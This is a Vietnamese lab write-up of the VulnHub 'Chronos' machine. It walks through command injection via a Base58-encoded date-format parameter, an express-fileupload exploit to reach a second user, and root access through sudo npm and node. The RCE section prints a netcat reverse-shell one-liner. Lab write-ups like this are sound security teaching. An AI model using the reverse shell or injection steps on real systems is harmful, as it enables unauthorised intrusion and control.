## Chronos

![image](https://hackmd.io/_uploads/Bkzorp9Ekl.png)

Link truy cập và tải [lab](https://www.vulnhub.com/entry/chronos-1,735/)

### Discover

Dùng netdiscover scan để tìm máy vuln:

![image](https://hackmd.io/_uploads/By7OLTcE1x.png)

Phát hiện thấy IP 192.168.1.11 có tên "PCS Systemtechnik GmbH" rất lạ, dùng nmap scan host này được kết quả như trên. Do mình đang dùng Bridge mode nên scan sẽ có các máy khác trong LAN. 
Vì máy vuln Chronos mình cài đặt trên VirtualBox (do cài trên máy VMware bị lỗi), nên từ kết quả scan trên, 192.168.1.11 chính là IP của máy vuln Chronos.
### enum
Dùng nmap scan port:

![image](https://hackmd.io/_uploads/S12Ku6qE1g.png)

Scan sâu hơn 3 port 22,80,8000 xem sao: 

![image](https://hackmd.io/_uploads/H1CkKa9Nyg.png)

Scan xong ta thấy được chi tiết các service và version trên các port. Truy cập port 80 xem sao: 

![image](https://hackmd.io/_uploads/r1lD5pq4ke.png)

Dùng gobuster để dò các folder, file trên trang này: 

![image](https://hackmd.io/_uploads/r1ZumA54kl.png)

Không thu được gì thú vị, xem source trang web, ta thấy có đoạn script:
![image](https://hackmd.io/_uploads/rypWVC5NJl.png)

Có vẻ như là một request AJAX đến port 8000 trên máy vuln. Dựa vào nội dung "onreadystatechange", "innerHTML", đoạn script này có vẻ sẽ thay đổi nội dung trang web khi request AJAX thành công , do domain chronos.local chưa được định nghĩa, ta gán IP máy 192.168.1.11 cho domain này trong file host: 

![image](https://hackmd.io/_uploads/rk1aEC9E1l.png)

Lưu lại file và thử request lại trang web xem có gì thay đổi:

![image](https://hackmd.io/_uploads/SkgXUA5Nyg.png)

Có vẻ request thành công và hiển thị thời gian hiện tại trên trang web.

Truy cập riêng đoạn url trong đoạn script vừa rồi, truy cập trả về Permission Denied:

![image](https://hackmd.io/_uploads/BkbbpyiV1e.png)

![image](https://hackmd.io/_uploads/rkW_ygo4Jx.png)

Thử truy cập riêng chronos.local:8000, không có "Permission Denied" ở đây:

![image](https://hackmd.io/_uploads/rkfWyesEyx.png)

Có vẻ request cần thay đổi một chút, do ajax request ta vừa xem ở trên có chứa khá nhiều tham số, xem lại thấy có header User-agent:

![image](https://hackmd.io/_uploads/HyldDlloE1g.png)
Vì đoạn code bị obfuscate nên không rõ các đối số được tùy chỉnh như thế nào, bật inspect, vào network và reload lại trang ban đầu để kiểm tra request ajax: 

![image](https://hackmd.io/_uploads/ry5V-liEye.png)

Request không bị ban, truy cập kiểm tra Header:

![image](https://hackmd.io/_uploads/rJudZgsN1e.png)

Như ta thấy, phần header User-agent được đặt thành Chronos. Sử dụng curl (hoặc Burp) custom lại header ta truy cập được vào link mà không bị ban nữa:

![image](https://hackmd.io/_uploads/SkHmQxjVkl.png)

Đoạn format=... nhìn có vẻ khá giống với Base64, ném lên CyberChef thì nhận được giải mã là Base58:

![image](https://hackmd.io/_uploads/B1NxEloEke.png)

Đoạn Output từ base58 khá giống với các option format từ lệnh date trên linux:

![image](https://hackmd.io/_uploads/rkn1Igs4kg.png)

![image](https://hackmd.io/_uploads/BkwMSes4ye.png)

### RCE
Mình nghĩ ngay web này dính lỗi command injection, thử chèn vào đoạn lệnh ls -la rồi encode lại:

![image](https://hackmd.io/_uploads/H1_b5gsVyx.png)

![image](https://hackmd.io/_uploads/HkbecgsEyx.png)

Tuyệt vời, web dính command injection, rce ở đây thôi.
Sau nhiều lần thử các command reverse shell trên revshells.com. Có đoạn revshell sau là hoạt động: 
`rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/sh -i 2>&1 | nc 192.168.1.12 4444 > /tmp/f`

![image](https://hackmd.io/_uploads/SJW7H4oNJx.png)

Mã hóa lại bằng Base58, bật nc listener để nhận shell, sau đó gửi request với đoạn Base58 vừa tạo: 

![image](https://hackmd.io/_uploads/BybxL4oVJg.png)

![image](https://hackmd.io/_uploads/Hkrx84s41g.png)

Kiểm tra thư mục hiện tại, thấy có 4 file cấu thành trang web này:

![image](https://hackmd.io/_uploads/rJc2UEsNke.png)

Sau khi kiểm tra, thấy không có gì thú vị có thể khai thác được, dùng pwd thì biết được người dùng đang ở vị trí /opt/chronos, do thư mục /opt thường được sử dụng để cài đặt các app, "cd" ra ngoài thư mục thì phát hiện thêm một thư mục chronos-v2, bên trong chứa folder backend và frontend,  và một file index.html

![image](https://hackmd.io/_uploads/Hy9mYVj4Jl.png)

Có vẻ thú vị. Kiểm tra backend trước: 

![image](https://hackmd.io/_uploads/rk15HSjVyg.png)

Ta kiểm tra thì thấy có file express-fileupload 1.1.7. Sau khi search, lib này version này có chứa lỗ hổng dẫn đến RCE: 

![image](https://hackmd.io/_uploads/Skk5UBjN1x.png)

Vì hiện tại mình đang RCE máy này rồi nên suy nghĩ k biết RCE tiếp để làm gì :>

![image](https://hackmd.io/_uploads/HykyDrjNyl.png)

Tuy nhiên, sau khi kiểm tra các tiến trình đang chạy thì thấy chronos-v2 đang được chạy bởi người dùng khác với người dùng chạy chronos mà mình đang RCE: 

![image](https://hackmd.io/_uploads/HJpx_SjNyg.png)

Thú vị, có lý do để khai thác RCE lib fileupload mà mình tìm thấy bên trên. Dùng lệnh netstat để kiểm tra các kết nối trên hệ thống hiện tại:

![image](https://hackmd.io/_uploads/Hk-s_rsV1g.png)

![image](https://hackmd.io/_uploads/H1Y0dBjNye.png)

Ta phát hiện ra ngoài 2 port 22, 8000 từ scan nmap, còn có port 53 Dns, và port 8080. Do đó ta suy luận rằng web chronos-v2 đang chạy trên port 8080. 
Do chỉ chạy trên địa chỉ local 127.0.0.1 nên ta không thể truy cập từ máy kali được. Dùng curl trên kết nối rce hiện tại, mình xác nhận rằng chronos-v2 đang chạy trên port 8080 ở local: 

![image](https://hackmd.io/_uploads/HJdxcrsN1x.png)

Tải payload khai thác về và sửa lại thông tin IP máy kali và máy vuln: 

![image](https://hackmd.io/_uploads/HJxtaBjEke.png)

Lưu file và gửi qua máy vuln bằng python htt.server: 

![image](https://hackmd.io/_uploads/H1oM2Bi4kl.png)

![image](https://hackmd.io/_uploads/BkMm3riN1e.png)

![image](https://hackmd.io/_uploads/Byd72HsN1g.png)

Chạy file này sau khi bật nc lister máy kali port 8888, ta nhận được shell:

![image](https://hackmd.io/_uploads/HyGZ0SiVJe.png)

### priv to root with sudo perm
Tuyệt vời luôn :)) Mình đang ở trong 2 shell RCE 2 người dùng trên một hệ thống :> .Kiểm tra quyền sudo của người dùng imera này xem sao: 

![image](https://hackmd.io/_uploads/BywIRBo4kx.png)

Khá nguy hiểm, 2 lệnh npm và node được chạy với quyền root mà không cần nhập pass cho lệnh sudo (cái này chắc chủ ý đặt để sudo cho tiện đây mà :>).
Lên [gtfobin](https://gtfobins.github.io/) tìm vector khai thác với npm và node: 

![image](https://hackmd.io/_uploads/HkEEJIoV1e.png)

![image](https://hackmd.io/_uploads/HJ7qy8j41l.png)

Thử cả 2, đều cho ta priv lên người dùng root:
+ sudo npm:

![image](https://hackmd.io/_uploads/HymSfIsEJe.png)

+ sudo node:

![image](https://hackmd.io/_uploads/Hy4DzUoVyl.png)

Ta giải quyết xong bài lab!
